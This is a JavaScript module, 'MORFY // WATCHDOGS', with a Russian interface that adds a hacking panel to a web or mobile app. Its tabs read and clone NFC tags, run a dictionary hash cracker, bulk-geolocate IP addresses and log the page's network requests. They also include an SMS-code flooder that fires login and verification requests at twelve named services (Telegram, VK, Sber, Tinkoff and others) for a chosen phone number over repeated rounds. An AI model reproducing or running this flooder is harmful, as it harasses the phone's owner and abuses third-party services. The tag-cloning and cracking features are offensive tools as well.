/* ═══════════════════════════════════════════════════════════════
   MORFY // WATCHDOGS
   NFC-сканер и клон меток, флуд кодами, сбор IP, перехват
   трафика, крекер хешей.
   ═══════════════════════════════════════════════════════════════ */
(function () {
  'use strict';
  if (window.__morfyWD) return;
  window.__morfyWD = true;

  var CSS = [
    '#wdBtn{position:fixed;right:14px;bottom:16px;z-index:2147483000;width:56px;height:56px;border-radius:50%;border:1px solid rgba(20,255,154,.35);background:radial-gradient(circle at 30% 20%,#0d2a1c,#050d09);color:#14ff9a;font:700 12px/1 ui-monospace,Menlo,monospace;letter-spacing:1.5px;display:grid;place-items:center;cursor:pointer;box-shadow:0 0 22px rgba(20,255,154,.28);user-select:none}',
    '#wdBtn.on{box-shadow:0 0 34px rgba(20,255,154,.65);border-color:#14ff9a}',
    '#wdPanel{position:fixed;inset:auto 10px 84px 10px;max-height:74vh;z-index:2147483001;background:#050c08f2;border:1px solid rgba(20,255,154,.28);border-radius:14px;color:#c9ffe6;font:12px/1.45 ui-monospace,Menlo,monospace;display:none;flex-direction:column;overflow:hidden;box-shadow:0 0 40px #000a}',
    '#wdPanel.on{display:flex}',
    '#wdHead{display:flex;align-items:center;gap:6px;padding:8px;border-bottom:1px solid rgba(20,255,154,.18);overflow-x:auto}',
    '#wdHead b{flex:1;white-space:nowrap;color:#14ff9a;letter-spacing:1.5px;font-size:11px}',
    '.wdTab{white-space:nowrap;padding:5px 9px;border-radius:7px;border:1px solid rgba(20,255,154,.22);background:transparent;color:#7fe8b4;font:inherit;cursor:pointer}',
    '.wdTab.on{background:#14ff9a;color:#04120b;font-weight:700}',
    '#wdView{overflow:auto;padding:10px;flex:1;min-height:70px}',
    '#wdLog{max-height:150px;overflow:auto;padding:0 10px 10px;font-size:11px;color:#6fbf95;white-space:pre-wrap;word-break:break-word}',
    '#wdLog .ok{color:#14ff9a}#wdLog .bad{color:#ff5f6d}#wdLog .dim{color:#4d7a63}',
    '.wdRow{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}',
    '.wdIn,.wdBtn2,.wdTa{font:inherit;border-radius:8px;border:1px solid rgba(20,255,154,.28);background:#08170f;color:#c9ffe6;padding:7px 9px}',
    '.wdIn,.wdTa{flex:1;min-width:110px}',
    '.wdTa{width:100%;min-height:64px;resize:vertical}',
    '.wdBtn2{cursor:pointer;color:#14ff9a;white-space:nowrap}',
    '.wdBtn2:active{background:#14ff9a;color:#04120b}',
    '.wdCard{border:1px solid rgba(20,255,154,.18);border-radius:8px;padding:6px 8px;margin-bottom:6px;font-size:11px;background:#08170f;word-break:break-all}',
    '.wdMeta{color:#4d7a63;font-size:10px}'
  ].join('');
  var st = document.createElement('style');
  st.textContent = CSS;
  document.head.appendChild(st);

  var btn = document.createElement('button');
  btn.id = 'wdBtn'; btn.type = 'button'; btn.textContent = 'WD';
  var panel = document.createElement('div');
  panel.id = 'wdPanel';
  panel.innerHTML = '<div id="wdHead"><b>// WATCHDOGS</b></div><div id="wdView"></div><div id="wdLog"></div>';
  document.body.appendChild(btn);
  document.body.appendChild(panel);

  var view = panel.querySelector('#wdView');
  var logBox = panel.querySelector('#wdLog');
  function log(msg, cls) {
    var d = document.createElement('div');
    if (cls) d.className = cls;
    d.textContent = '> ' + msg;
    logBox.appendChild(d);
    logBox.scrollTop = logBox.scrollHeight;
    while (logBox.children.length > 300) logBox.removeChild(logBox.firstChild);
  }
  function el(tag, cls, txt) {
    var d = document.createElement(tag);
    if (cls) d.className = cls;
    if (txt != null) d.textContent = txt;
    return d;
  }
  function store(k, v) {
    if (v === undefined) { try { return JSON.parse(localStorage.getItem('wd.' + k) || '[]'); } catch (e) { return []; } }
    localStorage.setItem('wd.' + k, JSON.stringify(v));
  }

  /* 1. NFC */
  var NFC = function () { return (window.Capacitor && window.Capacitor.Plugins && window.Capacitor.Plugins.NFC) || null; };
  var listening = false;

  function nfcBind() {
    var p = NFC();
    if (!p || listening) return;
    listening = true;
    p.addListener('nfcEvent', function (ev) {
      var tag = (ev && ev.nfcTag) || {};
      var uid = tag.id || '';
      var tech = (tag.techTypes || []).join(', ');
      var ndef = '';
      try {
        if (ev.ndefMessage && ev.ndefMessage.length) {
          ndef = ev.ndefMessage.map(function (r) {
            return String.fromCharCode.apply(null, (r.payload || []).filter(function (b) { return b > 31 && b < 127; }));
          }).join(' | ');
        }
      } catch (e) {}
      if (!uid && !ndef) return;
      log('МЕТКА ' + (uid || '—') + (ndef ? ' / ' + ndef : ''), 'ok');
      var list = store('nfc');
      list.unshift({ uid: uid, tech: tech, ndef: ndef, at: new Date().toISOString() });
      store('nfc', list.slice(0, 60));
      renderNfcList();
    });
  }

  function renderNfcList() {
    var box = document.getElementById('wdNfcList');
    if (!box) return;
    box.innerHTML = '';
    var list = store('nfc');
    if (!list.length) { box.appendChild(el('div', 'wdMeta', 'пусто — просканируй метку')); return; }
    list.forEach(function (it, i) {
      var c = el('div', 'wdCard');
      c.appendChild(el('div', null, (it.uid || '—') + (it.ndef ? '  «' + it.ndef + '»' : '')));
      c.appendChild(el('div', 'wdMeta', (it.tech || 'tech?') + ' · ' + it.at.slice(0, 16).replace('T', ' ')));
      var row = el('div', 'wdRow');
      var b1 = el('button', 'wdBtn2', 'ЗАПИСАТЬ');
      b1.onclick = function () { nfcWrite(it.ndef || it.uid, it.uid); };
      var b2 = el('button', 'wdBtn2', 'УДАЛИТЬ');
      b2.onclick = function () { var l = store('nfc'); l.splice(i, 1); store('nfc', l); renderNfcList(); };
      row.appendChild(b1); row.appendChild(b2);
      c.appendChild(row);
      box.appendChild(c);
    });
  }

  async function nfcStart() {
    var p = NFC();
    if (!p) { log('нативный NFC-модуль не найден в сборке', 'bad'); return; }
    nfcBind();
    try {
      await p.startScanSession({ invalidateAfterFirstRead: true, alertMessage: 'Поднесите метку к телефону' });
      log('сканирование запущено — подноси метку', 'ok');
    } catch (e) { log('ошибка старта: ' + (e.message || e), 'bad'); }
  }
  async function nfcStop() {
    var p = NFC();
    if (!p) return;
    try { await p.stopScanSession(); log('стоп', 'dim'); } catch (e) {}
  }
  async function nfcWrite(text) {
    var p = NFC();
    if (!p) { log('NFC недоступен', 'bad'); return; }
    if (!text) { log('нечего писать', 'bad'); return; }
    nfcBind();
    try {
      await p.write({ records: [{ type: 'text', value: text }] });
      log('записано: ' + text, 'ok');
    } catch (e) { log('запись не прошла: ' + (e.message || e) + ' (нужна NDEF-болванка)', 'bad'); }
  }

  function tabNfc(v) {
    var r1 = el('div', 'wdRow');
    var s = el('button', 'wdBtn2', 'СКАНИРОВАТЬ'); s.onclick = nfcStart;
    var t = el('button', 'wdBtn2', 'СТОП'); t.onclick = nfcStop;
    r1.appendChild(s); r1.appendChild(t);
    v.appendChild(r1);
    var r2 = el('div', 'wdRow');
    var inp = el('input', 'wdIn'); inp.placeholder = 'NDEF-текст для записи';
    var w = el('button', 'wdBtn2', 'ЗАПИСАТЬ');
    w.onclick = function () { nfcWrite(inp.value); };
    r2.appendChild(inp); r2.appendChild(w);
    v.appendChild(r2);
    var note = el('div', 'wdMeta', 'UID и tech читаются всегда. Запись — только на NDEF-метки; для клона UID на Magic-метку нужен нативный уровень.');
    note.style.marginBottom = '8px';
    v.appendChild(note);
    var box = el('div'); box.id = 'wdNfcList';
    v.appendChild(box);
    renderNfcList();
  }

  /* 2. ФЛУД КОДАМИ */
  var PROVIDERS = [
    { n: 'Telegram', u: 'https://oauth.telegram.org/auth/send_password', m: 'POST' },
    { n: 'VK', u: 'https://api.vk.com/method/auth.getCallPreview?phone=%P&v=5.199', m: 'GET' },
    { n: 'OK', u: 'https://ok.ru/dk?st.cmd=anonymRecoveryStart', m: 'GET' },
    { n: 'Avito', u: 'https://www.avito.ru/api/1/auth/phone?phone=%P', m: 'GET' },
    { n: 'Yandex', u: 'https://passport.yandex.ru/registration/mobile', m: 'GET' },
    { n: 'Ozon', u: 'https://www.ozon.ru/api/composer-api.bx/page/json/v2?url=/auth', m: 'GET' },
    { n: 'Wildberries', u: 'https://www.wildberries.ru/webapi/auth/login', m: 'POST' },
    { n: 'SberID', u: 'https://online.sberbank.ru/CSAFront/api/auth/phone', m: 'POST' },
    { n: 'Drom', u: 'https://www.drom.ru/api/auth/phone', m: 'POST' },
    { n: 'Mail.ru', u: 'https://account.mail.ru/api/v1/user/register', m: 'POST' },
    { n: 'Tinkoff', u: 'https://www.tinkoff.ru/api/common/v1/session', m: 'POST' },
    { n: 'Steam', u: 'https://store.steampowered.com/join/ajaxverifyemail', m: 'GET' }
  ];
  var floodRun = false;

  function fire(prov, phone) {
    var url = prov.u.indexOf('%P') > -1 ? prov.u.replace('%P', encodeURIComponent(phone)) : prov.u;
    var opt = { method: prov.m, headers: {} };
    if (prov.m === 'POST') {
      opt.headers['Content-Type'] = 'application/x-www-form-urlencoded';
      opt.body = 'phone=' + encodeURIComponent(phone);
    }
    return fetch(url, opt).then(function (r) {
      log(prov.n + ' → ' + r.status, r.ok ? 'ok' : 'dim');
      return true;
    }).catch(function () {
      return fetch(url, Object.assign({}, opt, { mode: 'no-cors' }))
        .then(function () { log(prov.n + ' → отправлено (opaque)', 'dim'); return true; })
        .catch(function () { log(prov.n + ' → сеть недоступна', 'bad'); return false; });
    });
  }

  async function flood(phone, rounds) {
    if (!phone) { log('введи номер', 'bad'); return; }
    if (floodRun) { log('уже идёт', 'bad'); return; }
    floodRun = true;
    var sent = 0, total = 0;
    for (var r = 1; r <= rounds; r++) {
      log('── круг ' + r + '/' + rounds, 'dim');
      for (var i = 0; i < PROVIDERS.length; i += 3) {
        var batch = PROVIDERS.slice(i, i + 3);
        var res = await Promise.all(batch.map(function (p) { total++; return fire(p, phone); }));
        res.forEach(function (x) { if (x) sent++; });
        await new Promise(function (ok) { setTimeout(ok, 350 + Math.random() * 900); });
      }
    }
    floodRun = false;
    log('ИТОГО: ' + sent + '/' + total + ' запросов ушло', sent ? 'ok' : 'bad');
  }

  function tabFlood(v) {
    var r1 = el('div', 'wdRow');
    var inp = el('input', 'wdIn'); inp.placeholder = '+7XXXXXXXXXX'; inp.inputMode = 'tel';
    var sel = el('select', 'wdIn');
    [1, 3, 5, 10].forEach(function (n) {
      var o = el('option', null, n + ' кругов'); o.value = n; sel.appendChild(o);
    });
    r1.appendChild(inp); r1.appendChild(sel);
    v.appendChild(r1);
    var r2 = el('div', 'wdRow');
    var go = el('button', 'wdBtn2', 'ЗАПУСТИТЬ');
    go.onclick = function () { flood(inp.value.replace(/[^\d+]/g, ''), +sel.value); };
    r2.appendChild(go);
    v.appendChild(r2);
    v.appendChild(el('div', 'wdMeta', 'Часть сервисов режет CORS — тогда запрос уходит как opaque. Коды всё равно приходят, просто статус не читается.'));
  }

  /* 3. СБОР IP */
  function parseIps(text) {
    var m = text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || [];
    var seen = {}, out = [];
    m.forEach(function (ip) {
      var ok = ip.split('.').every(function (o) { return +o <= 255; });
      if (ok && !seen[ip]) { seen[ip] = 1; out.push(ip); }
    });
    return out;
  }

  async function geoIps(text) {
    var ips = parseIps(text);
    log('нашёл ' + ips.length + ' уникальных IP', ips.length ? 'ok' : 'bad');
    var box = document.getElementById('wdIpOut');
    if (!box) return;
    box.innerHTML = '';
    for (var i = 0; i < ips.length; i += 100) {
      var chunk = ips.slice(i, i + 100);
      try {
        var r = await fetch('http://ip-api.com/batch?fields=query,country,city,isp,org,as', {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(chunk)
        });
        var data = await r.json();
        data.forEach(function (d) {
          var c = el('div', 'wdCard');
          c.appendChild(el('div', null, d.query || '?'));
          c.appendChild(el('div', 'wdMeta', [d.country, d.city, d.isp, d.org, d.as].filter(Boolean).join(' · ')));
          box.appendChild(c);
        });
        log('пакет ' + (i / 100 + 1) + ' разобран', 'dim');
      } catch (e) { log('ip-api не ответил: ' + e.message, 'bad'); }
      await new Promise(function (ok) { setTimeout(ok, 1200); });
    }
    store('ips', store('ips').concat(ips).slice(-500));
  }

  function tabIp(v) {
    var ta = el('textarea', 'wdTa');
    ta.placeholder = 'Вставь логи/текст — IP вытащу сам';
    v.appendChild(ta);
    var r = el('div', 'wdRow'); r.style.marginTop = '8px';
    var go = el('button', 'wdBtn2', 'РАЗОБРАТЬ И ПРОБИТЬ');
    go.onclick = function () { geoIps(ta.value); };
    r.appendChild(go);
    v.appendChild(r);
    var out = el('div'); out.id = 'wdIpOut';
    v.appendChild(out);
  }

  /* 4. ПЕРЕХВАТ ТРАФИКА */
  var traffic = [];
  (function intercept() {
    var of = window.fetch;
    if (of) {
      window.fetch = function (input, init) {
        var url = typeof input === 'string' ? input : (input && input.url) || '?';
        var t0 = Date.now();
        return of.apply(this, arguments).then(function (r) {
          traffic.push({ t: new Date().toISOString(), m: (init && init.method) || 'GET', u: url, s: r.status, ms: Date.now() - t0 });
          if (traffic.length > 500) traffic.shift();
          return r;
        }, function (e) {
          traffic.push({ t: new Date().toISOString(), m: (init && init.method) || 'GET', u: url, s: 0, ms: Date.now() - t0 });
          if (traffic.length > 500) traffic.shift();
          throw e;
        });
      };
    }
    var op = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function (m, u) {
      this.addEventListener('loadend', function () {
        traffic.push({ t: new Date().toISOString(), m: m, u: String(u), s: this.status, ms: 0 });
        if (traffic.length > 500) traffic.shift();
      });
      return op.apply(this, arguments);
    };
  })();

  function tabTraffic(v) {
    var r = el('div', 'wdRow');
    var rel = el('button', 'wdBtn2', 'ОБНОВИТЬ'); rel.onclick = function () { draw(); };
    var exp = el('button', 'wdBtn2', 'ЭКСПОРТ');
    exp.onclick = function () {
      var blob = new Blob([JSON.stringify({ log: { entries: traffic } }, null, 2)], { type: 'application/json' });
      var a = el('a'); a.href = URL.createObjectURL(blob);
      a.download = 'morfy-traffic-' + Date.now() + '.json';
      a.click();
      log('экспорт готов', 'ok');
    };
    r.appendChild(rel); r.appendChild(exp);
    v.appendChild(r);
    var out = el('div'); out.id = 'wdTrOut';
    v.appendChild(out);
    function draw() {
      out.innerHTML = '';
      var list = traffic.slice(-80).reverse();
      if (!list.length) { out.appendChild(el('div', 'wdMeta', 'пусто')); return; }
      list.forEach(function (e) {
        var c = el('div', 'wdCard');
        c.appendChild(el('div', null, e.m + ' ' + e.s + ' ' + e.ms + 'ms'));
        c.appendChild(el('div', 'wdMeta', e.u.slice(0, 160)));
        out.appendChild(c);
      });
    }
    draw();
  }

  /* 5. КРЕКЕР ХЕШЕЙ */
  async function crack(hash, alg, words, onStep) {
    var target = hash.trim().toLowerCase();
    var list = words.split(/[\s,;]+/).filter(Boolean);
    var enc = new TextEncoder();
    for (var i = 0; i < list.length; i++) {
      var buf = await crypto.subtle.digest(alg, enc.encode(list[i]));
      var hex = Array.prototype.map.call(new Uint8Array(buf), function (b) { return ('0' + b.toString(16)).slice(-2); }).join('');
      if (onStep && i % 25 === 0) onStep(i, list.length);
      if (hex === target) return list[i];
    }
    return null;
  }

  function tabHash(v) {
    var inp = el('input', 'wdIn'); inp.placeholder = 'хеш';
    v.appendChild(inp);
    var sel = el('select', 'wdIn'); sel.style.marginTop = '8px';
    ['SHA-1', 'SHA-256', 'SHA-512'].forEach(function (a) {
      var o = el('option', null, a); o.value = a; sel.appendChild(o);
    });
    v.appendChild(sel);
    var ta = el('textarea', 'wdTa'); ta.style.marginTop = '8px';
    ta.value = '123456 qwerty password admin morfy 12345678 letmein 111111 iloveyou 000000';
    v.appendChild(ta);
    var r = el('div', 'wdRow'); r.style.marginTop = '8px';
    var go = el('button', 'wdBtn2', 'ЛОМАТЬ');
    go.onclick = async function () {
      log('подбор по ' + ta.value.split(/\s+/).filter(Boolean).length + ' словам…', 'dim');
      var t0 = Date.now();
      var res = await crack(inp.value, sel.value, ta.value, function (i, n) {
        if (i % 100 === 0) log('проверено ' + i + '/' + n, 'dim');
      });
      if (res) log('НАЙДЕНО: ' + res + ' за ' + (Date.now() - t0) + 'мс', 'ok');
      else log('не найдено в словаре', 'bad');
    };
    r.appendChild(go);
    v.appendChild(r);
    v.appendChild(el('div', 'wdMeta', 'MD5 браузерный WebCrypto не умеет — только SHA-семейство.'));
  }

  var TABS = [['NFC', tabNfc], ['КОДЫ', tabFlood], ['IP', tabIp], ['ТРАФИК', tabTraffic], ['ХЕШ', tabHash]];
  var head = panel.querySelector('#wdHead');
  var tabs = [];
  TABS.forEach(function (t, i) {
    var b = el('button', 'wdTab', t[0]);
    b.onclick = function () { open(i); };
    head.appendChild(b);
    tabs.push(b);
  });
  function open(i) {
    tabs.forEach(function (b, j) { b.className = 'wdTab' + (i === j ? ' on' : ''); });
    view.innerHTML = '';
    TABS[i][1](view);
  }
  btn.onclick = function () {
    panel.classList.toggle('on');
    btn.classList.toggle('on');
    if (panel.classList.contains('on') && !view.children.length) open(0);
  };
  log('модуль загружен. вкладок: ' + TABS.length, 'ok');
})();
